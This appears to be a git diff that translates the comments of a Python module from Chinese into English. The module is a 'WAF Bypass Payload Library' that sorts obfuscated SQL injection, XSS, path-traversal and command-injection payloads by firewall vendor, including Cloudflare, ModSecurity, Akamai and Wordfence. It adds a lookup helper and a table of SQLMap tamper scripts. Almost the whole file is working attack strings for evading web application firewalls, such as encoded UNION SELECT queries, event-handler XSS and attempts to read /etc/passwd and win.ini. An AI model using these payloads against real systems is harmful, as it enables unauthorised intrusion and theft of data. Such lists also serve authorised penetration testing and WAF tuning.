@@ -1,141 +1,140 @@
-"""WAF 绕过 Payload 库
+"""WAF Bypass Payload Library
 
-按 WAF 类型和漏洞类型分类的绕过 payload。
-参考 SQLMap tamper scripts 和社区 WAF 绕过经验。
+Bypass payloads categorized by WAF type and vulnerability type.
+References SQLMap tamper scripts and community WAF bypass experience.
 """
+
 from typing import Dict, List
 
-# 绕过 payload 库
+# Bypass payload library
 BYPASS_PAYLOADS: Dict[str, Dict[str, List[str]]] = {
-    # ========== Cloudflare 绕过 ==========
+    # ========== Cloudflare bypass ==========
     "cloudflare": {
         "sqli": [
-            # 大小写混淆
+            # Case obfuscation
             "uNion SeLeCT 1,2,3--",
             "UniOn SelEct 1,2,3,4,5--",
-            # 注释混淆
+            # Comment obfuscation
             "union/**/select/**/1,2,3--",
             "union/*!50001select*/1,2,3--",
-            # 混合
+            # Mixed
             "UniOn/**/SeLeCt/**/1,2,3--",
-            # 空格替换
+            # Space replacement
             "union\t select 1,2,3--",
             "union\x0bselect 1,2,3--",
-            # URL 编码
+            # URL encoding
             "union%20select%201,2,3--",
             "union%0aselect%0a1,2,3--",
-            # 双重 URL 编码
+            # Double URL encoding
             "union%2520select%25201,2,3--",
         ],
         "xss": [
-            # 大小写混淆
+            # Case obfuscation
             "<ScRiPt>alert(1)</sCrIpT>",
             "<IMG SRC=j&#97;vascript:alert(1)>",
-            # 事件处理混淆
+            # Event handler obfuscation
             "<svg onload=alert(1)>",
-            "<IMG SRC=\"x\" ONERROR=\"alert(1)\">",
-            # 注释混淆
+            '<IMG SRC="x" ONERROR="alert(1)">',
+            # Comment obfuscation
             "<scr\x00ipt>alert(1)</scr\x00ipt>",
             "<scr/**/ipt>alert(1)</scr/**/ipt>",
-            # Unicode 编码
+            # Unicode encoding
             "<\u0073\u0063\u0072\u0069\u0070\u0074>alert(1)</script>",
-            # 混合
+            # Mixed
             "<ScRiPt>al\u0065rt(1)</sCrIpT>",
         ],
         "lfi": [
-            # 路径混淆
+            # Path obfuscation
             "....//....//....//etc/passwd",
             "....\\/....\\/....\\/etc/passwd",
             "..%252f..%252f..%252fetc/passwd",
             "..%c0%af..%c0%af..%c0%afetc/passwd",
-            # 编码绕过
+            # Encoding bypass
             "/etc/passwd%00",
             "/etc/passwd%00.jpg",
-            # 注释混淆
+            # Comment obfuscation
             "/etc/*/passwd",
             "/etc/***/passwd",
         ],
         "cmdi": [
-            # 管道符混淆
+            # Pipe character obfuscation
             "cat /etc/passwd|ls",
             "cat /etc/passwd%0als",
-            # 命令混淆
+            # Command obfuscation
             "cat${IFS}/etc/passwd",
             "cat\x09/etc/passwd",
-            # 编码
+            # Encoding
             "cat /etc/passwd%0a",
-            # 组合
+            # Combined
             "cat%09/etc/passwd|ls%0a",
-        ]
+        ],
     },
-
-    # ========== ModSecurity 绕过 ==========
+    # ========== ModSecurity bypass ==========
     "modsecurity": {
         "sqli": [
-            # 注释混淆 (最重要)
+            # Comment obfuscation (most important)
             "union/*!50001select*/1,2,3--",
             "union/*!50000select*/1,2,3--",
             "union/*!12345select*/1,2,3--",
-            # 内联注释绕过版本检测
+            # Inline comment version detection bypass
             "/*!50001union*/ /*!50001select*/1,2,3--",
-            # 双重编码
+            # Double encoding
             "union%2500select%25001,2,3--",
             "union%2520select%25201,2,3--",
-            # 空格替换
+            # Space replacement
             "union%09select%091,2,3--",
             "union%0bselect%0b1,2,3--",
             "union%0cselect%0c1,2,3--",
             "union%a0select%a01,2,3--",
-            # 浮点数
+            # Floating point
             "union select 1,2,3 from users where id=1.0",
-            # 括号
+            # Parentheses
             "union(select(1),2,3)",
         ],
         "xss": [
-            # 事件处理器混淆
+            # Event handler obfuscation
             "<img src=x onerror=alert(1)>",
             "<svg/onload=alert(1)>",
-            # 标签混淆
+            # Tag obfuscation
             "<script /onload=alert(1)>",
             # Unicode
             "<script>al\\u0065rt(1)</script>",
-            # 编码
+            # Encoding
             "<script>alert(String.fromCharCode(49))</script>",
         ],
         "lfi": [
-            # 双重编码
+            # Double encoding
             "..%252f..%252f..%252fetc/passwd",
             "..%255c..%255c..%255cwindows\\win.ini",
             # Null byte
             "../../etc/passwd%00.jpg",
-            # 路径混淆
+            # Path obfuscation
             "....//....//etc/passwd",
         ],
         "cmdi": [
-            # 换行符
+            # Newline
             "cat /etc/passwd%0a id",
-            # 制表符
+            # Tab character
             "cat\x09/etc/passwd",
-            # $() 替代
+            # $() substitution
             "$(cat /etc/passwd)",
-            # 反引号
+            # Backtick
             "`cat /etc/passwd`",
-        ]
+        ],
     },
-
-    # ========== AWS WAF 绕过 ==========
+    # ========== AWS WAF bypass ==========
     "aws_waf": {
         "sqli": [
             # JSON body
             '{"id": "1 OR 1=1"}',
-            # 分块传输
-            # (需要手动设置 Transfer-Encoding: chunked)
-            # 组合拳
+            # Chunked transfer
+            # (requires manually setting Transfer-Encoding: chunked)
+            # Combined approach
             "union%20select%201,2,3--",
         ],
         "xss": [
             "<svg onload=alert(1)>",
-            # 编码
+            # Encoding
             "<script>alert(/xss/)</script>",
         ],
         "lfi": [
@@ -145,23 +144,22 @@ BYPASS_PAYLOADS: Dict[str, Dict[str, List[str]]] = {
         "cmdi": [
             "id",
             "ls",
-        ]
+        ],
     },
-
-    # ========== Akamai 绕过 ==========
+    # ========== Akamai bypass ==========
     "akamai": {
         "sqli": [
-            # 大小写
+            # Case
             "UniOn SeLeCt 1,2,3--",
-            # Unicode 混淆
+            # Unicode obfuscation
             "un\u0069on sel\u0065ct 1,2,3--",
-            # 注释
+            # Comment
             "union/**/select/**/1,2,3--",
         ],
         "xss": [
             # Unicode
             "<\u0073\u0063\u0072\u0069\u0070\u0074>alert(1)</script>",
-            # 混合
+            # Mixed
             "<ScRiPt>alert(1)</sCrIpT>",
         ],
         "lfi": [
@@ -171,28 +169,27 @@ BYPASS_PAYLOADS: Dict[str, Dict[str, List[str]]] = {
         "cmdi": [
             "cat${IFS}/etc/passwd",
             "cat%09/etc/passwd",
-        ]
+        ],
     },
-
-    # ========== Incapsula/Imperva 绕过 ==========
+    # ========== Incapsula/Imperva bypass ==========
     "incapsula": {
         "sqli": [
-            # HTTP 参数污染 (HPP)
+            # HTTP Parameter Pollution (HPP)
             "id=1&id=2 OR 1=1--",
             "id=1/**/OR/**/1=1--",
-            # 分割 payload
+            # Split payload
             "id=1' UNI",
             "ON SEL",
             "ECT 1,2,3--",
-            # 注释
+            # Comment
             "union/*a*/select/*b*/1,2,3--",
         ],
         "xss": [
-            # 事件处理器
+            # Event handler
             "<img src=x onerror=alert(1)>",
-            # 绕过关键字检测
+            # Keyword detection bypass
             "<scr\x00ipt>",
-            # 多重编码
+            # Multi-layer encoding
         ],
         "lfi": [
             "../../etc/passwd",
@@ -201,40 +198,38 @@ BYPASS_PAYLOADS: Dict[str, Dict[str, List[str]]] = {
         "cmdi": [
             "id",
             "ls",
-        ]
+        ],
     },
-
-    # ========== Wordfence 绕过 ==========
+    # ========== Wordfence bypass ==========
     "wordfence": {
         "sqli": [
-            # 时间延迟
+            # Time delay
             "1' AND SLEEP(5)--",
             "1' AND (SELECT SLEEP(5))--",
-            # 注释混淆
+            # Comment obfuscation
             "1'/**/AND/**/1=1--",
-            # 分割
+            # Split
             "1' UN",
             "ION SEL",
             "ECT 1--",
         ],
         "xss": [
-            # 时间延迟触发
+            # Time-based trigger
             "<script>setTimeout(alert(1),1000)</script>",
-            # 编码
+            # Encoding
         ],
         "lfi": [
             "/etc/passwd",
         ],
         "cmdi": [
-            # Ping 延迟
+            # Ping delay
             "ping -c 5 127.0.0.1",
-        ]
+        ],
     },
-
-    # ========== 默认绕过 (通用) ==========
+    # ========== Default bypass (generic) ==========
     "default": {
         "sqli": [
-            # 标准混淆
+            # Standard obfuscation
             "1' OR '1'='1",
             "1' OR 1=1--",
             "admin'--",
@@ -242,34 +237,34 @@ BYPASS_PAYLOADS: Dict[str, Dict[str, List[str]]] = {
             # Union
             " UNION SELECT 1,2,3--",
             " UNION ALL SELECT 1,2,3,4,5--",
-            # 盲注
+            # Blind injection
             "1' AND 1=1--",
             "1' AND 1=2--",
-            # 报错注入
+            # Error-based injection
             "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
-            # 注释
+            # Comment
             "1'/*comment*/OR/*comment*/1=1--",
         ],
         "xss": [
-            # 基础
+            # Basic
             "<script>alert(1)</script>",
             "<img src=x onerror=alert(1)>",
             "<svg onload=alert(1)>",
-            # 事件
+            # Event
             "<body onload=alert(1)>",
             "<input onfocus=alert(1) autofocus>",
-            # 其他标签
+            # Other tags
             "<iframe src=javascript:alert(1)>",
             "<object data=javascript:alert(1)>",
             "<embed src=javascript:alert(1)>",
         ],
         "lfi": [
-            # 基础
+            # Basic
             "../../../etc/passwd",
             "..\\..\\..\\windows\\win.ini",
             "/etc/passwd",
             "c:\\windows\\win.ini",
-            # 常用路径
+            # Common paths
             "../../../../../../etc/passwd",
             "....//....//....//etc/passwd",
             "..%2f..%2f..%2fetc%2fpasswd",
@@ -286,13 +281,13 @@ BYPASS_PAYLOADS: Dict[str, Dict[str, List[str]]] = {
             "type c:\\windows\\win.ini",
             "ipconfig",
             "whoami /all",
-        ]
-    }
+        ],
+    },
 }
 
 
 def get_bypass_payloads(waf_type: str = "default", vuln_type: str = "sqli") -> List[str]:
-    """获取绕过 payload"""
+    """Get bypass payloads"""
     if waf_type in BYPASS_PAYLOADS:
         if vuln_type in BYPASS_PAYLOADS[waf_type]:
             return BYPASS_PAYLOADS[waf_type][vuln_type]
@@ -300,23 +295,23 @@ def get_bypass_payloads(waf_type: str = "default", vuln_type: str = "sqli") -> L
     return BYPASS_PAYLOADS.get("default", {}).get(vuln_type, [])
 
 
-# SQLMap 风格tamper脚本参考
+# SQLMap-style tamper script reference
 TAMPER_SCRIPTS = {
-    "space2comment": "空格替换为注释",
-    "space2hash": "空格替换为 #%0a",
-    "space2mysqlblank": "空格替换为 MySQL 空白字符",
-    "space2mysqldash": "空格替换为 --%0a",
-    "space2plus": "空格替换为 +",
-    "charencode": "URL 编码",
-    "charunicodeencode": "Unicode 编码",
-    "between": "BETWEEN 替换 AND",
-    "percentage": "添加 % 前缀",
-    "ifnull2ifisnull": "IFNULL 替换为 IF IS NULL",
+    "space2comment": "Replace space with comment",
+    "space2hash": "Replace space with #%0a",
+    "space2mysqlblank": "Replace space with MySQL blank characters",
+    "space2mysqldash": "Replace space with --%0a",
+    "space2plus": "Replace space with +",
+    "charencode": "URL encoding",
+    "charunicodeencode": "Unicode encoding",
+    "between": "Replace AND with BETWEEN",
+    "percentage": "Prepend % prefix",
+    "ifnull2ifisnull": "Replace IFNULL with IF IS NULL",
 }
 
 
 if __name__ == "__main__":
-    # 测试
+    # Test
     payloads = get_bypass_payloads("cloudflare", "sqli")
     print(f"Cloudflare SQLi bypasses: {len(payloads)}")
     for p in payloads[:5]:
